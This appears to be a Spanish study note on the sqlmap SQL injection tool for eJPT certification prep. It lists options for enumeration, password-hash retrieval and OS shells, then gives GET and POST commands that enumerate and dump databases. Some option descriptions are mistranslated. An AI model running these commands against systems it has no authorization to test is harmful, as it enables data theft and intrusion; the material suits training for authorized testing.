
### **Básico comandos:**  

| **Opciones**      | **Descripción**                                                       |
| ----------------- | --------------------------------------------------------------------- |
| -u URL, --url=URL | URL objetivo (por ejemplo, "http://www.site.com/vuln.php?id=1")       |
| --data=DATA       | Cadena de datos que se enviará a través de POST (por ejemplo, "id=1") |
| --random-agent    | Usar seleccionado al azar HTTP Valor de encabezado de usuario-agente  |
| -p TESTPARAMETER  | Parámetro comprobable(s)                                              |
| --level=LEVEL     | Nivel de pruebas a realizar (1-5, por defecto 1)                      |
| --risk=RISK       | Riesgo de pruebas a realizar (1-3, por defecto 1)                     |

### **Enumeración comandos:**

- Estas opciones se pueden usar para enumerar la información, la estructura y los datos del sistema de administración de bases de datos de back-end contenidos en las tablas.


| Opciones        | Descripción                                                |
| --------------- | ---------------------------------------------------------- |
| -a, --all       | Recuperar todo                                             |
| -b, - banner    | Recuperar banner DBMS                                      |
| --current-user  | Recuperar la base de datos actual de DBMS                  |
| --current-db    | Enumerar los hashes de contraseñas de los usuarios de DBMS |
| --passwords     | Enumerar los hashes de contraseñas de los usuarios de DBMS |
| --dbs           | Enumerar bases de datos DBMS                               |
| --tables        | Enumerar tablas de bases de datos DBMS                     |
| --columns       | Enumerar columnas de tabla de base de datos DBMS           |
| --schema        | Enumerar el esquema DBMS                                   |
| --dump          | Volcar entradas de tabla de base de datos DBMS             |
| --dump-all      | Volcar todas las entradas de tablas de bases de datos DBMS |
| --is-dba        | Detectar si el usuario actual de DBMS es DBA               |
| -D "DB NAME"    | Base de datos DBMS para enumerar                           |
| -T "TABLE NAME" | Tabla de base de datos DBMS(s) para enumerar               |
| -C COL          | Columna(s) de tabla de base de datos DBMS para enumerar    |

### **Acceso al sistema operativo comandos**

- Estas opciones se pueden usar para acceder al sistema de administración de bases de datos de back-end en el sistema operativo de destino.

| Opciones       | Descripción                                                         |
| -------------- | ------------------------------------------------------------------- |
| --os-shell     | Solicitud de un shell de sistema operativo interactivo              |
| --os-pwn       | Rápido para un shell OOB, Meterpreter o VNC                         |
| --os-cmd=OSCMD | Ejecute un comando del sistema operativo                            |
| --priv-esc     | Escalamiento de privilegios de usuario del proceso de base de datos |
| --os-smbrelay  | Solicitud de un clic para un shell OOB, Meterpreter o VNC           |
Tenga en cuenta que las tablas que se muestran arriba no son todos los interruptores posibles para usar con sqlmap. Para obtener una lista más extensa de opciones, ejecute `sqlmap -hh` para mostrar el mensaje de ayuda avanzado.
Ahora que hemos visto algunas de las opciones que podemos usar con sqlmap, vamos a saltar a los ejemplos utilizando solicitudes basadas en el Método GET y POST.

  
### **Simple HTTP Prueba GET Basada**

```
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```

Aquí hemos usado dos banderas: -u para indicar la URL vulnerable y --dbs para enumerar la base de datos.

### **Simple HTTP Prueba basada en POST**

- Primero, necesitamos identificar la solicitud POST vulnerable y guardarla. Para guardar la solicitud, Haga clic derecho en la solicitud, seleccione 'Copiar a archivo' y guárdela en un directorio. También puede copiar toda la solicitud y guardarla en un archivo de texto también.

![[Pasted image 20240325191912.png]]
Notará en la solicitud anterior, tenemos un parámetro POST 'sangre_grupo' que podría ser un parámetro vulnerable.

![[Pasted image 20240325191950.png]]

- Ahora que weizve identificó un parámetro potencialmente vulnerable, vamos a saltar al sqlmap y usar el siguiente comando:

```
sqlmap -r req.txt -p blood_group --dbs

sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
```

Aquí hemos usado dos banderas: -r para leer el archivo, -p para suministrar el parámetro vulnerable, y --dbs para enumerar la base de datos.

![[Pasted image 20240325192554.png]]
Ahora que tenemos las bases de datos, extraigamos tablas de la base de datos **sangre**.

### **Usando el Método basado en GET**

```
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables

sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

  
### **Uso del método basado en POST**

```
sqlmap -r req.txt -p blood_group -D blood --tables

sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```

Una vez que ejecutamos estos comandos, debemos obtener las tablas.

![[Pasted image 20240325193159.png]]Una vez que tengamos tablas disponibles, ahora vamos a reunir las columnas de la tabla sangre_db.

### **Usando el Método basado en GET**

```
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns

sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
```

### **Uso del método basado en POST**

```
sqlmap -r req.txt -D blood -T blood_db --columns

sqlmap -r req.txt -D <database_name> -T <table_name> --columns
```

![[Pasted image 20240325193330.png]]
O simplemente podemos volcar todas las bases de datos y tablas disponibles utilizando los siguientes comandos.

### **Usando el Método basado en GET**

```
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
  
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```
  
### **Uso del método basado en POST**

```
sqlmap -r req.txt -D <database_name> --dump-all
  
sqlmap -r req.txt-p  -D <database_name> --dump-all
```


enlace
[[Preparacion-Ejpt]]